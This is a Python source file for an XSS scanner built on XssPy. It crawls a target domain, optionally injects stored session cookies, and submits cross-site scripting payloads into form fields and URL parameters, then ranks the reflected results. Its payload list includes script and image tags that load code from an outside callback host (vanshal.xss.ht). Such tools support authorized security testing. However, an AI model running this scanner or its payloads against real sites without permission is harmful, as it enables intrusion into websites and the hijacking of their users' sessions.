'''
        -- Version 0.2 --
=================================
Improvements made by Stephen Bray
=================================

Built on top of the popular tool XssPy:
    XssPy - Finding XSS made easier
    Author: Faizan Ahmad (Fsecurify)
    Email: fsecurify@gmail.com
'''

import mechanize
import sys
import os
import httplib
import argparse
import logging
import time
import json

import Cookie
import cookielib
from urlparse import urlparse

br = mechanize.Browser()  # initiating the browser
br.addheaders = [
    ('User-agent',
     'Mozilla/5.0 (Windows; U; Windows NT 5.1; it; rv:1.8.1.11)Gecko/20071127 Firefox/2.0.0.11')
]
br.set_handle_robots(False)
br.set_handle_refresh(False)

payloads = ['<svg "ons>', '<img src=//vanshal.xss.ht>', '<script src=https://vanshal.xss.ht></script>']
# Need to add payloads to test things like single tick
urlpayloads = ['<svg%20"ons>', '<img%20src=//vanshal.xss.ht>', '<script%20src=https://vanshal.xss.ht></script>']
blacklist = ['.png', '.jpg', '.jpeg', '.mp3', '.mp4', '.avi', '.gif', '.svg',
             '.pdf']

# TOTAL CROSS SITE SCRIPTING FINDINGS
xssLinks = []
highProbLinks = []
medProbLinks = []
lowProbLinks = []

class color:
    BLUE = '\033[94m'
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BOLD = '\033[1m'
    END = '\033[0m'

    @staticmethod
    def log(lvl, col, msg):
        logger.log(lvl, col + msg + color.END)

logger = logging.getLogger(__name__)
lh = logging.StreamHandler()  # Handler for the logger
logger.addHandler(lh)
formatter = logging.Formatter('[%(asctime)s] %(message)s', datefmt='%H:%M:%S')
lh.setFormatter(formatter)

parser = argparse.ArgumentParser()
parser.add_argument('-u', action='store', dest='url',
                    help='The URL to analyze (without http:// or https://)')
parser.add_argument('-e', action='store_true', dest='compOn',
                    help='Enable comprehensive scan')
parser.add_argument('-v', action='store_true', dest='url_check',
                    help='Add testing for xss in urls')
parser.add_argument('-c', action='store', dest='cookies',
                    help='A json formatted file that contains a list of cookies')
results = parser.parse_args()

#logger.setLevel(logging.DEBUG if results.verbose else logging.INFO)
logger.setLevel(logging.INFO)
domain = results.url

# Live updates for user
#\033[K clears a line and \x1b[2J\x1b[H refreshes the screen
# Hacky as fuck and will probably break somehow
def interface(status, curr_url, element, url_count, iteration):
    sys.stdout.flush()

    sys.stdout.write("\x1b[2J\x1b[H" + color.RED + ""
    " ____  ___         _________              __    __\n"
    " \   \/  /  ______/   _____/_____   _____/  |__/  |_  ___________\n"
    "  \     /  /  ___/\_____  \\\____ \ /  _ \   __\   __\/ __ \_  __ \ \n"
    "  /     \  \___ \ /        \  |_> X  <_> )  |  |  | \  ___/|  | \/\n"
    " /___/\  \/____  >_______  /   __/ \____/|__|  |__|  \___  >__|\n"
    "       \_/     \/        \/|__|                          \/\n"
    "|-------------------------------------------------\n" + color.END + ""
    "|\n"
    "|\033[K Domain or Subdomain to Scan: " + color.BLUE + domain + color.END + "\n"
    "|\033[K Status: " + color.GREEN + status + color.END + "\n"
    "|\033[K URLs to Test: " + color.GREEN + (str(url_count) if url_count > 0 else "N/A") + color.END + "\n"
    "|\033[K Percentage Completed: " + (color.YELLOW if url_count != iteration else color.GREEN) + (("{0:.1f}").format(100 * (iteration / float(url_count))) if iteration >= 0 else "N/A") + color.END + "\n"
    "|\033[K Current URL: " + color.BLUE + curr_url + color.END + "\n"
    "|\033[K      Element: " + color.YELLOW + element + color.END + "\n"
    "|\033[K Vulnerabilities Found: " + (color.RED if len(xssLinks) > 0 else color.GREEN) + str(len(xssLinks)) + color.END + "\n"
    "|\033[K      High: " + color.RED + str(len(highProbLinks)) + color.END + "\n"
    "|\033[K      Medium: " + color.YELLOW + str(len(medProbLinks)) + color.END + "\n"
    "|\033[K      Low: " + color.GREEN + str(len(lowProbLinks)) + color.END + "\n"
    "|\033[K Most Recent Vulnerable Link: " + color.BLUE + (xssLinks[len(xssLinks)-1] if len(xssLinks) >= 1 else "N/A") + color.END +"\n"
    "\n"
    )

# Sort the payload into different categories based on likleyhood of exploit
# override to say that the payload is high probability
def sortPayload(payload, report, override = False):
    if payload in payloads[:2] or override:
        highProbLinks.append(report)
    elif payload == payloads[2]:
        lowProbLinks.append(report)
    else:
        medProbLinks.append(report)

def testPayload(payload, p, link):
    br.form[str(p.name)] = payload
    br.submit()
    # if payload is found in response, we have XSS
    if payload in br.response().read():
        #color.log(logging.DEBUG, color.BOLD + color.GREEN, 'XSS found!')
        report = 'Link: %s, Payload: %s, Element: %s' % (str(link),
                                                         payload, str(p.name))
        # Test for href= and src="javascript:alert()" which is xss, most other links with
        # javascript:alert() are not good
        if payload == payloads[2]:
            srcCheck = "src=\"" + payload + "\""
            hrefCheck = "href=\"" + payload + "\""
            if srcCheck in br.response().read() or hrefCheck in br.response().read():
                sortPayload(payload, report, True)
            else:
                sortPayload(payload, report)
        else:
            sortPayload(payload, report)


        xssLinks.append(report)
    br.back()

def testURL(payload, element, link):
    # if payload is found in response, we have XSS
    if payload in br.response().read():
        #color.log(logging.DEBUG, color.BOLD + color.GREEN, 'XSS found!')
        report = 'Link: %s, Payload: %s, Url Element: %s' % (str(link),
                                                         payload, element)
        if payload == payloads[2]:
            srcCheck = "src=\"" + payload + "\""
            hrefCheck = "href=\"confirm" + payload + "\""
            if srcCheck in br.response().read() or hrefCheck in br.response().read():
                sortPayload(payload, report, True)
            else:
                sortPayload(payload, report)
        else:
            sortPayload(payload, report)

        xssLinks.append(report)
    br.back()


def initializeAndFind():

    if not results.url:    # if the url has been passed or not
        #color.log(logging.INFO, color.GREEN, 'Url not provided correctly')
        return []

    firstDomains = []    # list of domains
    allURLS = []
    allURLS.append(results.url)    # just one url at the moment
    largeNumberOfUrls = []    # in case one wants to do comprehensive search

    # doing a short traversal if no command line argument is being passed
    #color.log(logging.INFO, color.GREEN, 'Doing a short traversal.')
    interface("Executing Short Traversal", "N/A", "N/A", -1, -1)
    for url in allURLS:
        smallurl = str(url)
        # Test HTTPS/HTTP compatibility. Prefers HTTPS but defaults to
        # HTTP if any errors are encountered
        # Removed the www from the link as that was causing issues with sites
        # not being served out of www
        # Also allows for the user to search for subdomains as well to be more precise
        try:
            test = httplib.HTTPSConnection(smallurl)
            test.request("GET", "/")
            response = test.getresponse()
            if (response.status == 200) | (response.status == 302):
                url = "https://" + str(url)
            elif response.status == 301:
                loc = response.getheader('Location')
                url = loc.scheme + '://' + loc.netloc
            else:
                url = "http://" + str(url)
        except:
            url = "http://" + str(url)
        try:
            if results.cookies:
                br.open(url)
                #color.log(logging.INFO, color.BLUE,
                #          'Adding cookie: %s' % cookie)
                # Attempt to add cookies to the session
                with open(results.cookies) as f:
                    data = json.load(f)

                for cookie in data:
                    name = cookie['name']
                    value = cookie['value']
                    br.set_cookie(name + "=" + value + "; expires=Wednesday, 08-Aug-19 10:40:40 GMT;")

            br.open(url)
            #color.log(logging.INFO, color.GREEN,
            #          'Finding all the links of the website ' + str(url))
            firstDomains.append(str(url)); # add the original link itself
            for link in br.links():        # finding the links of the website
                if smallurl in str(link.absolute_url):
                    firstDomains.append(str(link.absolute_url))
            firstDomains = list(set(firstDomains))
        except:
            pass
        #color.log(logging.INFO, color.GREEN,
        #          'Number of links to test are: ' + str(len(firstDomains)))
        if results.compOn:
            interface("Executing Comprehensive Traversal -- This may take a while", "N/A", "N/A", len(firstDomains), -1)
            for link in firstDomains:
                try:
                    br.open(link)
                    # going deeper into each link and finding its links
                    for newlink in br.links():
                        if smallurl in str(newlink.absolute_url):
                            largeNumberOfUrls.append(newlink.absolute_url)
                except:
                    pass
            firstDomains = list(set(firstDomains + largeNumberOfUrls))
            #color.log(logging.INFO, color.GREEN,
            #          'Total Number of links to test have become: ' +
            #          str(len(firstDomains)))  # all links have been found

    return firstDomains

# Removes links that are similar but have different variable values
# ex: https://a.com?value=55 and https://a.com?value=77
# Useless to test both as they will produce similar results
def trimLinks(firstDomains):
    interface("Removing duplicate urls", "N/A", "N/A", len(firstDomains), -1)
    polishedLinks = set()
    trimmedLinks = []

    for url in firstDomains:
        if '?' in str(url):
            polishedUrl = url
            query = str(url).split("?")[1] #Get the arguments
            elements = query.split('&') #Split by each argument
            for element in elements:
                polishedElement = element.split('=')[0]
                polishedUrl = polishedUrl.replace(element, polishedElement + '=xxx') #Replace each argument value
                                                                                     #with a constant
            lenBefore = len(polishedLinks) #Check the length before adding to set
            polishedLinks.add(polishedUrl) #Add the polished url to the set
            if lenBefore != len(polishedLinks): #If length of set does not go up we know that the link is duplicate
                trimmedLinks.append(url)
        elif '#' in str(url):
            polishedUrl = url
            query = str(url).split("#")[1] #Repeat code because functions are not as fun as a shit load of code
            polishedUrl = polishedUrl.replace(query,"xxx")

            lenBefore = len(polishedLinks)
            polishedLinks.add(url)
            if lenBefore != len(polishedLinks):
                trimmedLinks.append(url)
        else:
            lenBefore = len(polishedLinks)
            polishedLinks.add(url)
            if lenBefore != len(polishedLinks):
                trimmedLinks.append(url)
    trimmedLinks = list(trimmedLinks)
    return trimmedLinks

def listVulnLinks():
    if len(xssLinks) > 0:
        sys.stdout.flush()
        # print all xss findings
        if len(highProbLinks) > 0:
            sys.stdout.write(color.RED + color.BOLD + 'The following links have high probability of exploit:' + color.END + '\n')
            for link in highProbLinks:
                sys.stdout.write(color.RED + '   ' + link + color.END + "\n")

        if len(medProbLinks) > 0:
            sys.stdout.write(color.YELLOW + color.BOLD + 'The following links have medium probability of exploit:' + color.END + '\n')
            for link in medProbLinks:
                sys.stdout.write(color.YELLOW + '   ' + link + color.END + "\n")

        if len(lowProbLinks) > 0:
            sys.stdout.write(color.GREEN + color.BOLD + 'The following links have low probability of exploit:' + color.END + '\n')
            for link in lowProbLinks:
                sys.stdout.write(color.GREEN + '   ' + link + color.END + "\n")
    else:
        sys.stdout.flush()
        sys.stdout.write(color.YELLOW + 'No vulnerable links detected' + color.END + "\n")

def findxss(firstDomains):
    # starting finding XSS
    interface("Started Finding XSS", "N/A", "N/A", len(firstDomains), -1)
    #color.log(logging.INFO, color.GREEN, 'Started finding XSS')
    if firstDomains:    # if there is atleast one link
        count = 0 # Keep track of what url we are on
        for link in firstDomains:
            interface("Started Finding XSS", str(link), "N/A", len(firstDomains), count)
            count += 1
            blacklisted = False
            y = str(link)
            #color.log(logging.DEBUG, color.YELLOW, str(link))
            for ext in blacklist:
                if ext in y:
                    blacklisted = True
                    break
            if not blacklisted:
                try: # Section to change to also test in url and not just forms
                    # Currently we miss a large portion of vulnerabilites -- xss-game only gets first level
                    # Apparently it cant recognize the form tag
                    br.open(str(link))    # open the link
                    if br.forms():        # if a form exists, submit it
                        for form_num in range(0,len(br.forms())): # Added so that we explore all forms not just the first one
                            params = list(br.forms())[form_num]    # our form
                            br.select_form(nr=form_num)    # submit the first form
                            for p in params.controls:
                                par = str(p)
                                # submit only those forms which require text
                                if 'TextControl' in par:
                                    interface("Started Finding XSS", str(link), str(p.name), len(firstDomains), count)
                                    #color.log(logging.DEBUG, color.YELLOW,
                                    #          '\tParam: ' + str(p.name))
                                    for item in payloads:
                                        testPayload(item, p, link)
                except:
                    pass
                # Test for xss in the url only if the flag specifies it
                if results.url_check:
                    try:
                        # Custom script to test xss in url that is not a form
                        # Check that the element name is not p.name since that was
                        # a form that we already tested
                        if '?' in str(link): #If the link has ? then we know the possiblility of input being placed in dom is good
                            url_args = str(link).split("?")[1]
                            elements = url_args.split("&")
                            for assignment in elements: # Get each element and test it for xss
                                expression = assignment.split("=")
                                if len(expression) < 2:
                                    continue
                                # Get the element and value
                                element = expression[0]
                                value = expression[1]
                                interface("Started Finding XSS", str(link), element, len(firstDomains), count)
                                # Test out all of our payloads by appending them to the original value
                                for item in range(0,len(urlpayloads)):
                                    if item == urlpayloads[2]: #Javascript:alert() needs to be on its own since it can only be used by itself
                                        br.open(str(link).replace(assignment, element + '=' + urlpayloads[item]))
                                    else:
                                        br.open(str(link).replace(assignment, element + '=' + value + urlpayloads[item]))
                                    testURL(payloads[item], element, link)

                        # Custom build to check for values after #
                        if '#' in str(link):
                            for item in range(0,len(urlpayloads)):
                                interface("Started Finding XSS", str(link), "#", len(firstDomains), count)
                                br.open(str(link) + urlpayloads[item])
                                testURL(payloads[item], "#", link)
                    except:
                        pass

        interface("Finished Finding XSS", "N/A", "N/A", len(firstDomains), len(firstDomains))
        listVulnLinks()
    else:
        sys.stdout.flush()
        sys.stdout.write(color.RED + color.BOLD + 'No link found, exiting' + color.END + "\n")


# calling the function
firstDomains = trimLinks(initializeAndFind())
#firstDomains = initializeAndFind()
findxss(firstDomains)
